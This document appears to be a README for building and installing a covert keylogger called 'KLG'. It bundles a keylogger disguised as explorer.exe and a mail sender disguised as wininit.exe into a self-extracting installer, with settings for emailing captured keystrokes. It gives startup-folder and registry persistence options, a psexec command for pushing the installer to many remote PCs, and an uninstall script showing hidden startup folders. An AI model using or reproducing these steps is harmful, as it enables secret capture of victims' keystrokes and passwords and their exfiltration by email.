Instructions to Build Installer
==================================

1. Zip the content containing all files with 7 zip package.7z
	- Keylogger binary - explorer.exe
	- Send Mail binary - wininit.exe
	- settings.txt CSV - LogDir, CompName, sendTo, sendFrom, Password, RetryTime, PubIPURL
	- titles.txt (Optional) - Window titles at each line. If exists, keylogger will record keystrokes under those titles only

2. Optionally modify config.txt, It must be saved in UTF-8 Encoding. Ensure right bottom corner of Notepad++ shows **UTF-8-BOM**

3. in cmd type

       copy /b 7zsd.sfx+config.txt+package.7z nklg.exe

4. Use nklg.exe to Install KLG. Use cmd switch of nklg.exe to control type of installation

        nklg.exe	Default..AU
        nklg.exe -ai0	All Users Startup Shortcut(AU)
        nklg.exe -ai1	Users Startup Shortcut
        nklg.exe -ai2	HKLM
        nklg.exe -ai3	HKCU

Note that you must have administrative rights to perform -ai0 or -ai2


Instructions to Install/Uninstall
====================================

## Install

### On Local Computer:

	Run nklg.exe as Administrator

### On Remote PC's(Remote PC names are stored in comps.txt)

	psexec @comps.txt -u administrator -c -f -i nklg.exe

## Uninstall

*uklg.bat*
```
@echo off
taskkill /f /fi "USERNAME ne SYSTEM" /im wininit.exe
taskkill /f /fi "MEMUSAGE lt 13000" /im explorer.exe
DEL /Q /A C:\ProgramData\System
ATTRIB -S -H "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
ATTRIB -S -H "C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
DEL "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\Windows*"
DEL "C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Windows*"
```

### From Local Computer

	Run uklg.bat as administrator.

### From Remote Computer

1.Create a share "\\PC-NAME\share"
2.Put uklg.bat in "\\PC-NAME\share"
3.Disable password protected sharing from advanced sharing setting on PC-NAME.(win7)
4.Run following in cmd:
`psexec @comps.txt -u administrator -i cmd /c \\PC-NAME\share\uklg.bat`